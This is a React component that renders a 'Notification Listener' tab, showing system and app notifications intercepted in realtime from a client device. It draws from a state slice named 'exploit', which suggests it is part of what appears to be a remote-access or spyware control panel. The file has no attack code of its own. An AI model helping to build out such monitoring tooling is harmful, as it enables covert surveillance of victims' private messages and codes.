
import { Bell } from 'lucide-react'
import { useAppSelector } from '@/store/hooks'

export function NotificationsTab({ clientId }: { clientId: string }) {
  const notifications = useAppSelector(
    (s) => s.exploit.byClient[clientId]?.notifications ?? [],
  )

  return (
    <div className="space-y-4">
      <div className="flex items-center gap-2">
        <Bell className="h-4 w-4 text-emerald-400" />
        <h3 className="text-sm font-semibold text-zinc-100">
          Notification Listener
        </h3>
        <span className="inline-flex items-center gap-1 rounded bg-emerald-500/15 px-1.5 py-0.5 text-[10px] font-medium text-emerald-300 ring-1 ring-emerald-500/30">
          <span className="h-1.5 w-1.5 rounded-full bg-emerald-400 pulse-emerald" />
          Active
        </span>
      </div>
      <p className="text-xs text-zinc-500">
        Intercepts incoming system and app notifications in realtime.
      </p>

      <div className="rounded-xl border border-white/10 bg-black/40 max-h-96 overflow-y-auto scrollbar-emerald p-2 space-y-1">
        {notifications.length === 0 ? (
          <div className="px-3 py-8 text-center text-xs text-zinc-600">
            Waiting for notifications…
          </div>
        ) : (
          notifications.map((n, i) => (
            <div
              key={i}
              className="rounded-lg bg-zinc-900/50 px-3 py-2 hover:bg-white/[0.03]"
            >
              <div className="flex items-center justify-between gap-2 text-[10px] text-zinc-500">
                <span className="font-medium text-emerald-400/90 truncate">
                  {n.app}
                </span>
                <span className="shrink-0">{n.time}</span>
              </div>
              <div className="mt-0.5 text-sm font-semibold text-zinc-100">
                {n.title}
              </div>
              <div className="text-xs text-zinc-400">{n.content}</div>
            </div>
          ))
        )}
      </div>
    </div>
  )
}
